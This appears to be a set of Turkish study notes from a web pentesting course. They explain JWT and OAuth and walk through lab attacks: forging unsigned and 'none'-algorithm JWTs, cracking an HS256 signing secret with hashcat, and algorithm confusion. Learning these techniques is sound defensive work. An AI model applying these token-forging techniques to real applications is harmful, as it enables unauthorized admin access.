---
{"dg-publish":true,"permalink":"/web-pentest-expert/attacking-authentication-mechanisms/"}
---


Kuruluşlar, kullanıcıların yalnızca bir kez oturum açarak birden fazla uygulamaya ve web sitesine erişmesine olanak tanıyarak kullanıcı deneyimini kolaylaştırmayı amaçlamaktadır. Ayrıca yönetim kolaylığı sağlamak ve standart politikaları uygulamak için farklı kimlik doğrulama ve yetkilendirme silolarının sayısını azaltmak isteyebilirler. OAuth, OpenID Connect ve SAML gibi frameworkler kurumların güvenli ve standart kimlik doğrulama ve yetkilendirme akışları oluşturmasına yardımcı olabilir.


### Authentication vs. Authorization (Kimlik Doğrulama ve Yetkilendirme)

**Kimlik Doğrulama (Authentication)**, bir kullanıcının kimliğini doğrulama sürecidir. Kimlik doğrulamanın en yaygın şekli, kullanıcının kullanıcı adı ve şifresinin kontrol edilmesidir.  
Örneğin, bir kullanıcı, bir web sitesine kimliğini doğrulamak için kullanıcı adı ve şifre sağlar.

Bunun aksine, **Yetkilendirme (Authorization)**, bir kullanıcının izinleri veya erişim seviyeleri ile ilgilidir.  
Yetkilendirme genellikle bir erişim kontrol politikası tarafından yönetilir ve bu politikaların genel olarak dört türü vardır:

1. **İsteğe Bağlı Erişim Kontrolü (Discretionary Access Control - DAC)**
2. **Zorunlu Erişim Kontrolü (Mandatory Access Control - MAC)**
3. **Rol Tabanlı Erişim Kontrolü (Role-Based Access Control - RBAC)**
4. **Özellik Tabanlı Erişim Kontrolü (Attribute-Based Access Control - ABAC)**

Web uygulamaları için yaygın olarak kullanılan bir erişim kontrol politikası olan **RBAC**, kullanıcılara farklı izinler vermek için rollere dayanır.  
Örneğin:

- Bir **admin** kullanıcı, bir web sitesinde içerik değiştirme izni (yazma izni) sağlayan "writer" rolüne sahip olabilir.
- Normal bir kullanıcı ise yalnızca içerik okuma izni veren "reader" rolüne sahip olabilir.

Doğru yetkilendirme kontrolleri, normal bir kullanıcının web sitesinin içeriği üzerinde yazma izni almasını engeller.



### **Kimlik Doğrulama (Authentication) vs Yetkilendirme (Authorization)**

#### **Kimlik Doğrulama (Authentication)**

- **Kimlik doğrulama, bir kullanıcının kimliğini doğrulayarak korunan bir kaynağa erişim izni vermeden önce yapılan işlemdir.**
- Kimlik doğrulamanın temel amacı, bir kullanıcının kimliğini doğrulamak ve kötü niyetli kişilerin erişim elde etmesini önlemektir.
- Çoğu kimlik doğrulama mekanizması, kullanıcıların kimlik bilgilerini doğrulamaya dayanır. Bu bilgiler:
    - Kullanıcı adı ve şifre,
    - Güvenlik sorularına verilen yanıtlar,
    - Veya sadece kullanıcının erişebileceği bir ortamda (ör. telefon) gönderilen tek kullanımlık bir PIN/şifre (OTP) olabilir.
- Kimlik bilgilerine dayalı kimlik doğrulama, kullanıcı tarafından sağlanan kimlik bilgilerini bir veritabanı kaydıyla karşılaştırarak çalışır. Bilgiler tamamen eşleştiğinde, kullanıcıya hesabına erişim izni verilir.

#### **Yetkilendirme (Authorization)**

- **Yetkilendirme, bir kullanıcının korunan bir kaynağa erişim düzeyini bir erişim kontrol politikası kullanarak doğrulama sürecidir.**
- Yetkilendirmenin temel amacı, yalnızca izin verilmiş ve kimliği doğrulanmış kullanıcıların korunan kaynaklara erişimini sınırlamaktır.
- Dijital sistemler, birçok erişim kontrol politikasını kullanır. Bunların dört ana türü şunlardır:
    - İsteğe Bağlı Erişim Kontrolü (Discretionary Access Control - DAC)
    - Zorunlu Erişim Kontrolü (Mandatory Access Control - MAC)
    - Rol Tabanlı Erişim Kontrolü (Role-Based Access Control - RBAC)
    - Özellik Tabanlı Erişim Kontrolü (Attribute-Based Access Control - ABAC)
- Her erişim kontrol politikası, korunan bir kaynağa erişimi farklı mekanizmalar kullanarak sağlar.
    - Örneğin, RBAC rolleri kullanırken, ABAC özellikleri kullanır.


### Broken Authentication
Yanlış uygulanan erişim kontrol mekanizmalarına rastlamak nadir değildir. Bunun etkisi hassas bilgilerin ifşa edilmesinden temel sistemin tehlikeye atılmasına kadar uzanmaktadır. Örneğin, bir uygulamanın API'si aracılığıyla talep eden kullanıcıyı tanımlama yeteneğini tehlikeye atarsak, bu genel web uygulaması güvenliğini tehlikeye atar.

Kimlik doğrulama mekanizmaları, aşağıdakiler de dahil olmak üzere birçok şekilde tehlikeye atılabilir:

* Oturum açma sayfasını kullanıcı adları ve parolaların bir listesiyle kaba bir şekilde zorlamak
* JWT gibi imzasız veya zayıf imzalı oturum tokenlarının manipüle edilmesi
* Zayıf parolaları ve şifreleme anahtarlarını istismar etme
* Bir URL'den kimlik doğrulama token'ları ve parolaları alma

Broken Authentication modülü, kimlik doğrulama mekanizmalarına saldırmak için temel teknikleri ele aldı ve bu modül, ortak standartlara veya frameworklere dayanan daha gelişmiş kimlik doğrulama saldırılarından bazılarına odaklanacak.


### JWT

JSON Web Token (JWT), kriptografik olarak güvenli verilerin iletilmesine yönelik bir formattır. JWT'ler web uygulamalarında kimlik doğrulama ile doğrudan bağlantılı olmasa da, birçok web uygulaması JWT'leri stateless session token olarak kullanır. JSON nesneleri olarak kodlanan bu token'lar, bir client ve bir server arasında bilgi iletmek için güvenli ve verimli bir yoldur. JWT'ler üç ana bölümden oluşur: bir header, bir payload ve bir signature, kimlik doğrulama, yetkilendirme ve durum bilgisi alışverişi sağlar. Basitlikleri, esneklikleri ve farklı programlama dilleri ve platformlarında yaygın olarak desteklenmeleri nedeniyle token tabanlı kimlik doğrulama ve yetkilendirme mekanizmalarını uygulamak için popüler hale gelmişlerdir.


### OAuth
OAuth, kullanıcı kimlik bilgilerini paylaşmadan farklı web hizmetleri arasında güvenli yetkilendirmeye ve erişim yetkilendirmesine izin veren açık standart bir protokoldür. Kullanıcıların şifrelerini ifşa etmeden üçüncü taraf uygulamalara sosyal medya hesapları veya çevrimiçi bankacılık gibi diğer web hizmetlerindeki kaynaklara sınırlı erişim izni vermelerini sağlar. OAuth, token tabanlı kimlik doğrulama süreçleri aracılığıyla çalışır ve kullanıcı gizliliğini ve güvenliğini korurken servis sağlayıcılar ile tüketiciler arasında sorunsuz etkileşimleri kolaylaştırır. Çeşitli sektörlerde yaygın olarak benimsenen OAuth, modern web ve mobil uygulamalarda güvenli API erişimi ve yetkilendirmesi sağlamak için fiili standart haline gelmiştir


### SAML

Secure Assertion Markup Language (SAML), kimlik sağlayıcılar (IdP'ler) ve hizmet sağlayıcılar (SP'ler) arasında kimlik doğrulama ve yetkilendirme verilerinin alışverişi için XML tabanlı açık bir standarttır. SAML, çoklu oturum açmayı (SSO) mümkün kılarak kullanıcıların tek bir kimlik bilgisi setiyle birden fazla uygulama ve hizmete erişmesine olanak tanır. SAML iş akışında, kullanıcının kimliği IdP tarafından doğrulanır ve daha sonra kullanıcı özniteliklerini ve izinlerini içeren dijital olarak imzalanmış bir onay oluşturur. Bu onay SP'ye gönderilir, SP de bunu doğrular ve buna göre erişim izni verir. SAML, kurumsal ortamlarda ve web tabanlı uygulamalarda kimlik doğrulama süreçlerini kolaylaştırmak ve standartlaştırılmış protokoller ve iddialar aracılığıyla güvenliği artırmak için yaygın olarak kullanılmaktadır.



### Introduction to JWTs

Nasıl çalıştıkları, yapıları ve web uygulamalarının bunları nasıl kullandıkları da dahil olmak üzere JWT'lerin temellerini anlamak, saldırıların nasıl gerçekleştirileceğini ve bunlarla ilişkili güvenlik açıklarından nasıl yararlanılacağını öğrenmeden önce çok önemlidir.

[JWT'ler,](https://datatracker.ietf.org/doc/html/rfc7519) birden fazla taraf arasında aktarım için verileri (veya talepleri ) biçimlendirmenin bir yoludur. Bir JWT, JWT içinde yer alan verilerin korunması için [JSON Web Signature (JWS)](https://datatracker.ietf.org/doc/html/rfc7515) veya [JSON Web Encryption (JWE)](https://datatracker.ietf.org/doc/html/rfc7516) kullanabilir, ancak pratikte JWS web uygulamalarında çok daha yaygın olarak kullanılır. Bu nedenle, bu modülde yalnızca JWS kullanan JWT'leri tartışacağız. JWT'ler iki ek standarttan oluşur. Bunlar [JSON Web Anahtarı (JWK)](https://datatracker.ietf.org/doc/html/rfc7517) ve[ JSON Web Algoritmasıdır (JWA)](https://datatracker.ietf.org/doc/html/rfc7518). JWK kriptografik anahtarlar için bir JSON veri yapısı tanımlarken, JWA JWT'ler için kriptografik algoritmalar tanımlar.

Bir JWT, noktalarla ayrılmış üç bölümden oluşur:

![Pasted image 20241207181352.png](/img/user/resimler/Pasted%20image%2020241207181352.png)

![Pasted image 20241207181357.png](/img/user/resimler/Pasted%20image%2020241207181357.png)



![Pasted image 20241207181410.png](/img/user/resimler/Pasted%20image%2020241207181410.png)

![Pasted image 20241207181417.png](/img/user/resimler/Pasted%20image%2020241207181417.png)

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZ G1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA

Şimdi bu parçalara bakacağız ve JWT içindeki işlevlerini tartışacağız.

![Pasted image 20241207181459.png](/img/user/resimler/Pasted%20image%2020241207181459.png)

JWT'nin ilk kısmı header'ıdır. Token'ın kendisi hakkında meta veriler içerir ve yorumlanmasına olanak tanıyan bilgileri tutar. Örneğin, daha önceki örnek tokenımızın başlığına bakalım. İlk bölümün base64 kodunu çözdükten sonra, elimizde aşağıdaki JSON nesnesi kalır:

![Pasted image 20241207181534.png](/img/user/resimler/Pasted%20image%2020241207181534.png)

Gördüğümüz gibi, header bu durumda yalnızca iki parametreden oluşur. typ parametresi genellikle “JWT” olarak ayarlanır ve alg parametresi, token'ın güvence altına alındığı kriptografik imzayı veya MAC algoritmasını belirtir. Bu parametre için geçerli değerler JWA standardında tanımlanmıştır:

![Pasted image 20241207181704.png](/img/user/resimler/Pasted%20image%2020241207181704.png)

Örnek tokenımız bu durumda SHA-256 kullanılarak HMAC ile güvence altına alınmıştır. JWS standardında tanımlandığı gibi JWT başlığında tanımlanabilecek ek parametreler vardır, bunlardan bazılarına ilerleyen bölümlerde göz atacağız


### Payload

JWT payload orta kısımdır ve token'ı oluşturan gerçek verileri içerir. Bu veriler birden fazla talepten oluşur . Örnek JWT'nin payload'unun Base64 kod çözme işlemi aşağıdaki JSON verilerini ortaya çıkarır:

![Pasted image 20241207182025.png](/img/user/resimler/Pasted%20image%2020241207182025.png)


Kayıtlı iddialar (claims), JWT standardında tanımlanmıştır, ancak bir JWT payload’ı (yükü), kullanıcı tarafından tanımlanmış rastgele iddialar da içerebilir. Örneğimizde, **iss** iddiası, JWT'nin yayınlayıcısının kimliğini belirten kayıtlı bir iddiadır.  
**user** ve **isAdmin** iddiaları ise kayıtlı değildir ve bu belirli JWT'nin, görünüşe göre bir yönetici olan **admin** kullanıcısı için düzenlendiğini gösterir.


### Signature

JWT'nin son kısmı, header'da belirtilen algoritma kullanılarak JWT'nin header'ı, payload'ı ve bir secret signing key temelinde hesaplanan imzasıdır. Bu nedenle, JWT Token'ının bütünlüğü imza tarafından korunur. Header, payload veya imzanın kendisi içindeki herhangi bir veri manipüle edilirse, imza artık token ile eşleşmeyecek ve böylece manipülasyonun tespit edilmesini sağlayacaktır. Bu nedenle, bir JWT için geçerli bir imza hesaplamak üzere gizli imzalama anahtarının bilinmesi gerekir



### JWT-based Authentication

JWT'ler hakkında temel bilgileri öğrendiğimize göre, şimdi JWT'ler için tipik bir kullanım durumunu tartışalım: JWT tabanlı kimlik doğrulama.


### Stateful Authentication

Geleneksel olarak, kullanıcı web uygulamasına bir oturum belirteci (session token) sunar ve ardından web uygulaması, kullanıcının ilgili verilerini bir tür veritabanında arar.  
Web uygulamasının durumu, yani oturumla ilişkili verileri takip etmesi gerektiğinden, bu yaklaşım **durum bilgisi olan kimlik doğrulama (stateful authentication)** olarak adlandırılır.

![Pasted image 20241207190335.png](/img/user/resimler/Pasted%20image%2020241207190335.png)


### Stateless Authentication

Öte yandan, JWT tabanlı kimlik doğrulamada oturum tokenı, kullanıcı bilgilerini içeren bir JWT ile değiştirilir. Token'ın imzasını doğruladıktan sonra, sunucu tüm kullanıcı bilgilerini JWT'nin kullanıcı tarafından gönderilen taleplerinden alabilir. Sunucunun bir state tutmasına gerek olmadığı için bu yaklaşıma stateless authentication (durumsuz kimlik doğrulama) denir. JWT'nin imzasının bir saldırganın içindeki verileri manipüle etmesini engellediğini ve herhangi bir manipülasyonun başarısız bir imza doğrulamasıyla sonuçlanacağını unutmayın.

![Pasted image 20241207194908.png](/img/user/resimler/Pasted%20image%2020241207194908.png)



### İmza Doğrulamasına Saldırma

Önceki bölümde tartışıldığı gibi, imza JWT'nin payload'u içindeki verileri korur. İmzayı geçersiz kılmadan JWT'nin payload'u içindeki herhangi bir veriyi manipüle edemeyiz. Ancak, web uygulamalarında yanlış imza doğrulamasına yol açan ve JWT'nin payload'u içindeki verileri manipüle etmemize olanak tanıyan iki yanlış yapılandırma hakkında bilgi edineceğiz.

Burada tartışılan saldırılar gerçek dünyada çok yaygın olmasa da, bir web uygulaması ciddi şekilde yanlış yapılandırıldığında yine de ortaya çıkabilir.


### Eksik İmza Doğrulaması

Saldırıya geçmeden önce hedef web uygulamamıza bir göz atalım. Hedefimizi başlattığımızda ve verilen URL'ye eriştiğimizde, basit bir giriş sayfası ile karşılaşıyoruz:

![Pasted image 20241207215734.png](/img/user/resimler/Pasted%20image%2020241207215734.png)


Neredeyse boş bir sayfa görüntüleyen web uygulamasında oturum açmak için sağlanan kimlik bilgilerini kullanabiliriz:

![Pasted image 20241207215800.png](/img/user/resimler/Pasted%20image%2020241207215800.png)

Yönetici değilsiniz mesajı nedeniyle! mesajından, farklı ayrıcalık seviyelerine sahip kullanıcılar olduğu sonucunu çıkarabiliriz. Ayrıcalıklarımızı bir yöneticiye yükseltmenin bir yolunu bulup bulamayacağımızı araştıralım ve bunun bize daha fazla bilgi gösterip göstermeyeceğini görelim.

Başarılı bir oturum açma isteğine verilen yanıtta görebileceğimiz gibi, web uygulaması kullanıcımızı tanımlamak için session cookie'miz olarak bir JWT kullanır:

![Pasted image 20241207215926.png](/img/user/resimler/Pasted%20image%2020241207215926.png)

Yanıt aşağıdaki JWT'yi içerir:

![Pasted image 20241207215940.png](/img/user/resimler/Pasted%20image%2020241207215940.png)
![Pasted image 20241207215949.png](/img/user/resimler/Pasted%20image%2020241207215949.png)

Bir JWT'nin içeriğini analiz etmek için jwt.io veya CyberChef gibi web servislerini kullanabiliriz. JWT'yi jwt.io'ya yapıştırarak aşağıdaki payload'u görebiliriz:

![Pasted image 20241207220009.png](/img/user/resimler/Pasted%20image%2020241207220009.png)

![Pasted image 20241207220036.png](/img/user/resimler/Pasted%20image%2020241207220036.png)

JWT kullanıcı adımızı, bir isAdmin talebini ve bir sona erme timestamp'ını içerir. Amacımız ayrıcalıklarımızı bir yöneticiye yükseltmek olduğundan, isAdmin talebi bu hedefe ulaşmak için bariz bir yol gibi görünüyor. Bu parametreyi basitçe payload içinde değiştirebiliriz ve jwt.io sol taraftaki JWT'yi otomatik olarak yeniden kodlayacaktır. Ancak, daha önce tartışıldığı gibi, bu JWT'nin imzasını geçersiz kılacaktır.

İşte bu noktada ilk saldırımız devreye giriyor. Bir JWT'yi kabul etmeden önce, web uygulaması JWT'nin kurcalanmadığından emin olmak için imzasını doğrulamalıdır. Web uygulaması JWT'leri imzalarını doğrulamadan kabul edecek şekilde yanlış yapılandırılmışsa, ayrıcalıkları artırmak için JWT'mizi manipüle edebiliriz.

Bunu başarmak için jwt.io'da isAdmin parametresinin değerini true olarak değiştirelim:

![Pasted image 20241207220317.png](/img/user/resimler/Pasted%20image%2020241207220317.png)

Daha sonra session cookieindeki manipüle edilmiş JWT'yi /home'a istekte iletebiliriz:

![Pasted image 20241207220348.png](/img/user/resimler/Pasted%20image%2020241207220348.png)

Web uygulaması JWT'nin imzasını doğrulamadığı için bize yönetici erişimi verecektir:


### None Algorithm Attack

Web uygulamasının manipüle edilmiş bir JWT'yi kabul etmesini sağlamanın bir başka tekniği de none algoritmasını kullanmaktır. Önceki bölümde tartışıldığı gibi, bu algoritma JWT'nin bir imza içermediğini ve web uygulamasının bunu bir imza hesaplamadan kabul etmesi gerektiğini ima eder. İmza olmaması nedeniyle, web uygulaması yanlış yapılandırılmışsa imza doğrulaması olmadan bir token'ı kabul edecektir

none algoritması ile bir JWT'yi taklit etmek için, JWT'nin başlığındaki alg -claim'i none olarak ayarlamalıyız. Bunu [CyberChef](https://gchq.github.io/CyberChef/) kullanarak JWT Sign işlemini seçerek ve Signing algoritmasını None olarak ayarlayarak başarabiliriz. Daha sonra daha önce kullandığımız aynı JWT payload'unu belirtebiliriz ve CyberChef bizim için bir JWT oluşturacaktır:

![Pasted image 20241207231524.png](/img/user/resimler/Pasted%20image%2020241207231524.png)

![Pasted image 20241207231541.png](/img/user/resimler/Pasted%20image%2020241207231541.png)

Daha önce olduğu gibi, manipüle edilmiş JWT'yi session cookie'de /home'a istek olarak iletebiliriz:

![Pasted image 20241207231621.png](/img/user/resimler/Pasted%20image%2020241207231621.png)

Web uygulaması none algoritması ile JWT'yi kabul ettiği için bize admin erişimi verecektir:

![Pasted image 20241207231922.png](/img/user/resimler/Pasted%20image%2020241207231922.png)

Not: JWT bir imza içermese bile, son noktanın ( . ) hala mevcut olması gerekir.



### Attacking the Signing Secret

Önceki bölümde, JWT'lerin imza doğrulamasını atlatan saldırılardan bahsettik. Ancak, imzalama sırrını biliyor olsaydık, sahte bir JWT için geçerli bir imza oluşturabilirdik. Web uygulamasından geçerli bir JWT talep ettikten sonra, bunu elde etmek için imzalama sırrını bruteforce etmeye çalışırız.

JWT, potansiyel olarak tahmin edilebilir sırlara dayalı üç simetrik algoritmayı destekler: HS256 , HS384 ve HS512 .


### JWT'nin elde edilmesi

Tıpkı daha önce olduğu gibi, uygulamaya giriş yaparak geçerli bir JWT elde edebiliriz:

![Pasted image 20241207232748.png](/img/user/resimler/Pasted%20image%2020241207232748.png)

Daha sonra jwt.io üzerindeki alg -claim'i inceleyerek imza algoritmasını kontrol edebiliriz:

![Pasted image 20241207232805.png](/img/user/resimler/Pasted%20image%2020241207232805.png)

Gördüğümüz gibi, token HS256 simetrik algoritmasını kullanır; bu nedenle, imzalama sırrını potansiyel olarak brute-force edebiliriz.


### Cracking the Secret

JWT'nin sırrını brute-force etmek için hashcat kullanacağız. Hashcat'in 16500 modu JWT'ler içindir. Sırrı brute-force etmek için JWT'yi bir dosyaya kaydedelim:

![Pasted image 20241207233435.png](/img/user/resimler/Pasted%20image%2020241207233435.png)
![Pasted image 20241207233440.png](/img/user/resimler/Pasted%20image%2020241207233440.png)

Daha sonra, seçtiğimiz bir kelime listesi ile hashcat'i çalıştırabiliriz:

![Pasted image 20241207233458.png](/img/user/resimler/Pasted%20image%2020241207233458.png)
![Pasted image 20241207233503.png](/img/user/resimler/Pasted%20image%2020241207233503.png)


### Jeton Taklit Etme

Artık JWT'nin imzalama sırrını başarıyla zorladığımıza göre, geçerli JWT'leri taklit edebiliriz. JWT'nin gövdesini manipüle ettikten sonra, rayruben1 imzalama sırrını jwt.io'ya yapıştırabiliriz. Site daha sonra manipüle edilmiş JWT'miz için geçerli bir imza hesaplayacaktır:

![Pasted image 20241207233551.png](/img/user/resimler/Pasted%20image%2020241207233551.png)
Artık web uygulamasına yönetici erişimi elde etmek için sahte JWT'yi kullanabiliriz:

![Pasted image 20241207233610.png](/img/user/resimler/Pasted%20image%2020241207233610.png)


### Algoritma Karışıklığı

Algoritma karışıklığı, web uygulamasını JWT'nin imzasını doğrulamak için onu oluştururken kullanılandan farklı bir algoritma kullanmaya zorlayan bir JWT saldırısıdır.

Web uygulaması RS256 gibi asimetrik bir algoritma kullanıyorsa imzayı hesaplamak için private key (özel anahtar) kullanılır. Buna karşılık, imzayı doğrulamak için bir public key kullanılır, yani imzalama ve doğrulama için farklı bir anahtar kullanılır. HS256 gibi simetrik bir algoritma kullanan bir token oluşturursak, token'ın imzası JWT'yi imzalamak için kullanılan aynı anahtarla doğrulanabilir. Web uygulaması doğrulama için public anahtarı kullandığından, bu anahtarla imzalanmış tüm simetrik JWT'leri kabul edecektir. Adından da anlaşılacağı gibi, bu anahtar herkese açıktır ve web uygulamasının public anahtarıyla imzalayarak geçerli bir JWT'yi taklit etmemizi sağlar.

Bu saldırı yalnızca web uygulaması imza doğrulama algoritmasını belirlemek için JWT'nin alg -claim'inde belirtilen algoritmayı kullanırsa çalışır. Özellikle, web uygulaması imza doğrulama için her zaman aynı algoritmayı kullanacak şekilde yapılandırılarak güvenlik açığı önlenebilir. Örneğin, algoritmayı RS256 olarak sabit kodlayarak.


### Public Key'in Elde Edilmesi

Daha önce olduğu gibi, bir JWT elde etmek için örnek web uygulamamıza giriş yapabiliriz. Tokeni analiz edersek, asimetrik bir algoritma ( RS256 ) kullanılarak imzalandığını görebiliriz:

![Pasted image 20241207235012.png](/img/user/resimler/Pasted%20image%2020241207235012.png)

Daha önce olduğu gibi, bir algoritma confusion saldırısı yürütmek için, web uygulaması tarafından imza doğrulaması için kullanılan public key'e erişmemiz gerekir. Bu public key genellikle web uygulaması tarafından sağlanırken, doğrudan elde edemediğimiz durumlar da vardır. Ancak, anahtarın gizli tutulması amaçlanmadığından, JWT'lerin kendisinden hesaplanabilir

Bunu başarmak için [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) kullanacağız. Araç, JWT'leri imzalamak için kullanılan public anahtarı hesaplamak için kullanabileceğimiz bir docker container ile birlikte gelir.

Docker konteynerini şu şekilde oluşturabiliriz:

![Pasted image 20241207235145.png](/img/user/resimler/Pasted%20image%2020241207235145.png)

Şimdi docker konteynerini çalıştırabiliriz:

![Pasted image 20241207235157.png](/img/user/resimler/Pasted%20image%2020241207235157.png)

Aracı çalıştırmak için aynı public key ile imzalanmış iki farklı JWT sağlamalıyız. Burp Repeater'da login isteğini birden fazla kez göndererek birden fazla JWT elde edebiliriz. Daha sonra, yakalanan JWT'ler ile docker konteynerinde scripti çalıştırabiliriz:

![Pasted image 20241207235235.png](/img/user/resimler/Pasted%20image%2020241207235235.png)
![Pasted image 20241207235242.png](/img/user/resimler/Pasted%20image%2020241207235242.png)


---------


# Introduction to OAuth

[OAuth](https://datatracker.ietf.org/doc/html/rfc6749), servisler arasında güvenli yetkilendirme sağlayan bir standarttır. Bu nedenle OAuth, kullanıcıların birden fazla farklı servise erişmek için tek bir serviste oturum açmasına olanak tanıyan Single Sign-On (SSO) senaryolarında yaygın olarak kullanılır. OAuth bunu, kullanıcının kimlik bilgilerini servisler arasında paylaşmadan gerçekleştirir.

OAuth'ta güvenlik açıklarına yol açabilecek saldırılara ve yanlış yapılandırmalara geçmeden önce OAuth'un nasıl çalıştığını ele alalım.


## OAuth Entities

OAuth protokolü, aşağıdaki rol oynayan varlıklardan oluşur:

* ==Resource Owner (Kaynak Sahibi):== Kaynağın sahibi olan varlık. Bu genellikle kullanıcıdır
* ==Client (İstemci):== Kaynak sahibi adına kaynağa erişim talep eden hizmet
* ==Authorization Server (Yetkilendirme Sunucusu):== Kaynak sahibinin kimliğini doğrulayan ve client'a access token'ları veren sunucu
* ==Resource Server (Kaynak Sunucusu):== Client'ın erişmek istediği kaynakları barındıran sunucu

Bu varlıkların fiziksel olarak ayrı olmasının gerekli olmadığını unutmayın. Örneğin, yetkilendirme ve kaynak sunucuları aynı sistem olabilir.

Bu varlıklar arasındaki iletişim akışı soyut düzeyde aşağıdaki gibi işler:

* Client resource sahibinden yetkilendirme talep eder
* Client, kaynak sahibinden bir yetkilendirme izni alır
* Client yetkilendirme sunucusuna yetkilendirme iznini sunar
* Client yetkilendirme sunucusundan bir Access token alır
* Client access token'ı kaynak sunucusuna sunar
* Client kaynağı kaynak sunucusundan alır

![Pasted image 20241217235921.png](/img/user/resimler/Pasted%20image%2020241217235921.png)

Şimdi, konuyu daha açık hale getirmek için daha somut bir örneğe bakalım. Aşağıdaki varlıkları ele alacağız:

* Resource owner (Kaynak sahibi): John olarak adlandıracağımız kullanıcı
* Client: academy.htb adında hayali bir siber güvenlik eğitim platformu
* Authorization Server (Yetkilendirme Sunucusu): hubgit.htb adında sürüm kontrolü için hayali bir platform
* Resource Server: Kolaylık olması açısından, bu sunucu yetkilendirme sunucusu ile aynıdır: hubgit.htb

John'un hubgit.htb hesabını kullanarak academy.htb'ye giriş yapmak istediğini varsayalım. O zaman iletişim akışı şu şekilde olabilir:

1. John, **academy.htb** üzerinde **hubgit.htb ile Giriş Yap** seçeneğine tıklıyor ve **hubgit.htb**'nin giriş sayfasına yönlendiriliyor.
2. John, **hubgit.htb**'ye giriş yapıyor ve profil bilgilerine üçüncü taraf hizmeti ( third-party service) **academy.htb** tarafından erişilmesine izin veriyor.
3. **hubgit.htb**, **academy.htb**'ye bir yetkilendirme kodu (authorization grant) veriyor.
4. **academy.htb**, authorization grant **hubgit.htb**'ye sunuyor.
5. **hubgit.htb**, authorization grant'ı  doğruluyor ve **academy.htb**'ye access token gönderiyor. Bu token, **academy.htb**'nin John'un profil bilgilerine erişmesini sağlıyor.
6. **academy.htb**, acces token'ı kullanarak **hubgit.htb**'ye John'un profil bilgilerine erişmek için bir API isteği gönderiyor.
7. **hubgit.htb**,access token'u doğruluyor ve **academy.htb**'ye John'un profil bilgilerini sağlıyor.

![Pasted image 20241218000422.png](/img/user/resimler/Pasted%20image%2020241218000422.png)

Takastan sonra academy.htb, John'un hubgit.htb'deki profil bilgilerine erişebilir, yani John adına hubgit.htb'ye istekte bulunabilir. Bu, John'un kimlik bilgilerini academy.htb ile paylaşmadan gerçekleştirilir.

OAuth, farklı contexler ve kullanım durumları için kullanılan farklı izinler tanımlar. Biz sadece en yaygın iki izin türüne bakacağız: Authorization code grant ve implicit grant. Daha az yaygın olan izin türleri hakkında daha fazla ayrıntı için [OAuth standardına](https://datatracker.ietf.org/doc/html/rfc6749) bakın. Tüm isteklerin kullanıcının tarayıcısından başlatılmadığını unutmayın. Bazı istekler doğrudan client ve source server arasında gerçekleşir ve bu nedenle kullanıcı için transparandır.


## Authorization Code Grant

Authorization code grant en yaygın ve güvenli OAuth grant türüdür. Bu izin türünün akışı, yukarıda tartışılan soyut akışla aynıdır.

![Pasted image 20241218003121.png](/img/user/resimler/Pasted%20image%2020241218003121.png)


#### Step 1: Authorization Request

Bu grant türü, client academy.htb'den authorization server hubgit.htb'ye gelen authorization request ile başlar:

```http
GET /auth?client_id=1337&redirect_uri=http://academy.htb/callback&response_type=code&scope=user&state=a45c12e87d4522 HTTP/1.1 
Host: hubgit.htb
```

Bu istek birden fazla ilginç GET parametresi içerir:

* client_id: Client academy.htb için unique bir tanımlayıcı
* redirect_uri: Kaynak sahibi tarafından başarılı bir yetkilendirme yapıldıktan sonra tarayıcının yönlendirileceği URL
* response_type: Bu, authorization code grant için her zaman code olarak ayarlanır
* scope: Bu, client academy.htb'nin hangi kaynaklara erişmesi gerektiğini gösterir. Bu parametre isteğe bağlıdır
* state: Client tarafından oluşturulan ve yetkilendirme isteğini aşağıdaki callback isteğine bağlayan CSRF token'ına benzer bir amaca hizmet eden rastgele bir nonce. Bu parametre isteğe bağlıdır


#### Step 2: Resource Owner Authentication

Authorization server hubgit.htb, kullanıcıdan oturum açmasını ve client academy.htb'yi istenen kaynaklara erişmesi için yetkilendirmesini isteyecektir


#### Step 3: Authorization Code Grant

Authorization server, tarayıcıyı yetkilendirme isteğinin redirect_uri parametresinde belirtilen URL'ye yönlendirir:

```http
GET /callback?code=ptsmyq2zxyvv23bl&state=a45c12e87d4522 HTTP/1.1
Host: academy.htb
```

Bu request iki parametre içerir:

* code: Authorization server tarafından verilen yetkilendirme kodu
* state: Bu iki request birbirine bağlamak için yetkilendirme request'inden gelen state değeri


#### Step 4: Access Token Request
Client artık resource server için geçerli bir access token'a sahiptir ve bu access token'ı resource owner'ın bilgilerini talep etmek için kullanabilir. Bu, authorization code grant'taki ile aynıdır.

```http
GET /user_info HTTP/1.1
Host: hubgit.htb
Authorization: Bearer RsT5OjbzRn430zqMLgV3Ia
```


#### Step 5: Resource Response

Resource server access token'ı doğrular ve resource owner'ın bilgileri ile yanıt verir. Bu, authorization code grant'taki ile aynıdır.

```json
{username: "john", email: "[email protected]", id: 1337}
```


### Açıklamalar

Bu bölümde verilen OAuth açıklaması, bu modülün yazıldığı sırada en son sürüm olan [OAuth2.0 ](https://oauth.net/2/)için geçerlidir. Ancak, güncellenmiş bir sürüm olan [OAuth2.1](https://github.com/oauth-wg/oauth-v2-1) için bir taslak bulunmaktadır. OAuth2.0'a göre en önemli farklardan biri, [burada](https://github.com/oauth-wg/oauth-v2-1/blob/main/draft-ietf-oauth-v2-1.md#differences-from-oauth-20-oauth-2-0-differences) açıklandığı gibi implicit grant'ın kaldırılmasıdır.


# OAuth Lab Setup

Hatalı OAuth uygulamalarındaki güvenlik açıklarını tartışmadan önce, önümüzdeki bölümlerde çalışacağımız laboratuvarlara bir göz atalım. OAuth akışının karmaşıklığı nedeniyle, laboratuvarlar isteğe bağlı alıştırmalar halinde sunulacaktır. İçerikle birlikte ilerlemek için her bölümdeki laboratuvarı başlatmaktan çekinmeyin. Basitlik adına, önümüzdeki bölümlerde authorization code akışına odaklanacağız. Ancak, çoğu saldırı implicit kod akışı ile de aynı şekilde veya sadece küçük değişikliklerle çalışır.

Laboratuvarlar dört farklı bileşenden oluşmaktadır:

* OAuth Client: /client/ öneki altındaki tüm rotalar
* OAuth Resource Server: /resource/ öneki altındaki tüm rotalar
* OAuth Authorization Server: /authorization/ öneki altındaki tüm rotalar
* Bir Saldırgan Sunucu: attacker.htb virtual host altındaki tüm rotalar

